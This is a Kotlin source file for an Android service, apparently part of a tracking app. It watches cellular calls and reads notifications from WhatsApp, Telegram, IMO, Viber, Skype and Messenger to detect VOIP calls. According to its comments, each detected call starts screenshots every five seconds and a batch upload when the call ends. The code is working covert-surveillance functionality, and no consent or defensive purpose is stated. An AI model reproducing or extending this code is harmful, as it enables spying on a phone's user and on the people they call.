package com.tracker.app.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log

/**
 * Monitors all types of calls:
 * - Cellular calls via PhoneStateListener
 * - VOIP calls (WhatsApp, IMO, Telegram) via NotificationListenerService
 * 
 * When a call is detected as active, it triggers the screenshot timer (every 5 sec).
 * When the call ends, it triggers a batch upload.
 */
class CallMonitorService : NotificationListenerService() {

    companion object {
        private const val TAG = "CallMonitor"
        var instance: CallMonitorService? = null
        var onCallStarted: ((source: String) -> Unit)? = null
        var onCallEnded: ((source: String) -> Unit)? = null

        // Package names for VOIP apps
        private val VOIP_PACKAGES = mapOf(
            "com.whatsapp" to "whatsapp",
            "com.whatsapp.w4b" to "whatsapp",
            "com.imo.android.imoim" to "imo",
            "org.telegram.messenger" to "telegram",
            "com.facebook.orca" to "messenger",
            "com.viber.voip" to "viber",
            "com.skype.raider" to "skype",
        )

        private val CALL_NOTIFICATION_KEYWORDS = listOf(
            "ongoing call", "incoming call", "outgoing call",
            "video call", "voice call", "audio call",
            "calling", "on call", "in call", "ringing"
        )
    }

    private var activeVoipCall: String? = null
    private var activeCellularCall = false
    private var phoneStateListener: PhoneStateListener? = null

    override fun onCreate() {
        super.onCreate()
        instance = this
        setupCellularCallListener()
        Log.d(TAG, "Call Monitor Service created")
    }

    /**
     * Listen for standard cellular calls.
     */
    private fun setupCellularCallListener() {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager

        phoneStateListener = object : PhoneStateListener() {
            @Deprecated("Deprecated in Java")
            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                when (state) {
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        if (!activeCellularCall) {
                            activeCellularCall = true
                            Log.d(TAG, "Cellular call STARTED")
                            onCallStarted?.invoke("phone")
                        }
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        if (activeCellularCall) {
                            activeCellularCall = false
                            Log.d(TAG, "Cellular call ENDED")
                            onCallEnded?.invoke("phone")
                        }
                    }
                    TelephonyManager.CALL_STATE_RINGING -> {
                        Log.d(TAG, "Phone RINGING from: $phoneNumber")
                    }
                }
            }
        }

        @Suppress("DEPRECATION")
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
    }

    /**
     * Detect VOIP calls from WhatsApp, IMO, etc. by monitoring their notifications.
     * When a VOIP app posts a notification with call-related keywords, we treat it as a call.
     */
    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val appSource = VOIP_PACKAGES[packageName] ?: return

        val notification = sbn.notification
        val extras = notification.extras
        val title = extras.getString("android.title", "").lowercase()
        val text = extras.getString("android.text", "").lowercase()
        val content = "$title $text"

        // Check if this notification is call-related
        val isCallNotification = CALL_NOTIFICATION_KEYWORDS.any { keyword ->
            content.contains(keyword)
        }

        // Also check for ongoing/foreground call notifications (category = "call")
        val isCallCategory = notification.category == "call"

        if (isCallNotification || isCallCategory) {
            if (activeVoipCall == null) {
                activeVoipCall = appSource
                Log.d(TAG, "VOIP call STARTED from: $appSource")
                onCallStarted?.invoke(appSource)
            }
        }
    }

    /**
     * When a VOIP call notification is removed, the call likely ended.
     */
    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        val packageName = sbn.packageName
        val appSource = VOIP_PACKAGES[packageName] ?: return

        if (activeVoipCall == appSource) {
            Log.d(TAG, "VOIP call ENDED from: $appSource")
            activeVoipCall = null
            onCallEnded?.invoke(appSource)
        }
    }

    override fun onDestroy() {
        instance = null
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        @Suppress("DEPRECATION")
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
        super.onDestroy()
    }
}
